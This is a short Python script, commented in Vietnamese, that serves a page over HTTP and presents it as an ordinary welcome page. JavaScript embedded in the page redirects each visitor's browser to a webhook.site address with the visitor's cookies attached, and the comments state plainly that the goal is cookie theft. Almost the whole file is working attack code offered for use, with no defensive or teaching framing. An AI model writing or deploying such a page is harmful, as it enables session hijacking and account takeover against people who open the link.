from http.server import SimpleHTTPRequestHandler, HTTPServer
import logging

class MaliciousHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Trả về trang HTML chứa JavaScript độc hại
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        malicious_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Malicious Page</title>
        </head>
        <body>
            <h1>Welcome to my site!</h1>
            <script>
                // Đoạn JavaScript để lấy cookie của người dùng
                document.location="https://webhook.site/your-webhook-url?cookie=" + document.cookie;
            </script>
        </body>
        </html>
        """
        self.wfile.write(malicious_html.encode("utf-8"))

if __name__ == "__main__":
    # Địa chỉ và cổng của server
    host = "0.0.0.0"  # Đảm bảo có thể truy cập từ các máy khác
    port = 8080

    # Khởi tạo logging để dễ dàng theo dõi lỗi
    logging.basicConfig(level=logging.INFO)
    logging.info(f"Starting server on {host}:{port}")

    # Khởi chạy server
    server = HTTPServer((host, port), MaliciousHTTPRequestHandler)
    logging.info(f"Server running on {host}:{port}. Press Ctrl+C to stop.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logging.info("\nShutting down the server.")
        server.server_close()
